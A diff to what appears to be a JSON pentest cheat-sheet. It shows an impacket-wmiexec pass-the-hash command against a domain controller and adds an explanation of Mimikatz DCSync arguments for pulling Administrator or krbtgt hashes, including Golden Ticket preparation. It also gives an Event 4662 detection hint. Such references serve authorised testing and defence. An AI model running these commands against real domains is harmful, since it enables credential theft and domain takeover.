@@ -98,5 +98,6 @@
       "label": "Pass-the-Hash with obtained NTLM (Kali)",
       "command": "impacket-wmiexec <DOMAIN>/Administrator@<DC_IP> -hashes :<NTLM_HASH>"
     }
-  ]
+  ],
+  "explain": "Impersonates a DC's replication with Mimikatz to pull an account's password hash:\n  lsadump::dcsync          request Directory Replication of secrets\n  /domain:<domain>         the target domain\n  /user:Administrator      the account whose hash to replicate (use /user:krbtgt to prep a Golden Ticket, /all to dump everything - very loud)\nRequires Replicating Directory Changes (All) rights. Detect via Event 4662 with the replication GUIDs from a non-DC. Pass the obtained NTLM with wmiexec."
 }
